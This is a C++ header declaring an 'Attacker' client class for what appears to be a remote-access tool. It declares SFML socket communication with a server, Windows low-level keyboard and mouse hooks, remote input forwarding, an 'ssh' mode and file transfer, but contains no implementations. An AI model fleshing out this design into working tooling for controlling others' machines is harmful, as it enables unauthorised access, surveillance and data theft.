#include <SFML/Network.hpp>
#include <iostream>
#include <thread>
#include <windows.h>

#include "tui.hpp"

class Attacker {
public:
	Attacker(std::string inHId, ftxui::Tui& inTui);
	int update();

private:
	void receiveTcp();

	void connectServer(bool pw, std::string ipStr, short port);

	bool handleCmd(const std::string& s);
	void handlePacket(sf::Packet& p);
	void updateList(sf::Packet& p);

	void sendFile(std::string path, uint32_t numPackets);
	void getFile() {};

	static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	std::thread* receiveTcpThread = nullptr;
	sf::TcpSocket server;
	sf::IpAddress serverIp = sf::IpAddress(0, 0, 0, 0);

	uint16_t requestId = 1;
	//response id has been stripped
	std::vector<sf::Packet> packetsToProcess;
	std::map<uint16_t, sf::Packet> responsesToProcess;

	ftxui::Tui& tui;
	std::string myHId = "";
	int16_t myId = 0;
	int fps = 8;

	//does the server know about your existance?
	bool isInitialized = false;
	//do you have admin privileges?
	bool isAdmin = false;

	bool isSshActive = false;
	bool isSendingMouse = false;
	bool isSendingKeyboard = false;

	static constexpr size_t packetSize = 256 * 256;
	std::thread* sendFileThread = nullptr;
	bool isSendingFile = false;
	bool stopSendingFile = false;

	std::thread* getFileThread = nullptr;
	bool isGettingFile = false;
	bool stopGettingFile = false;

	static Attacker* attacker;
	sf::Clock mouseTimer;
	sf::Clock pingTimer;
};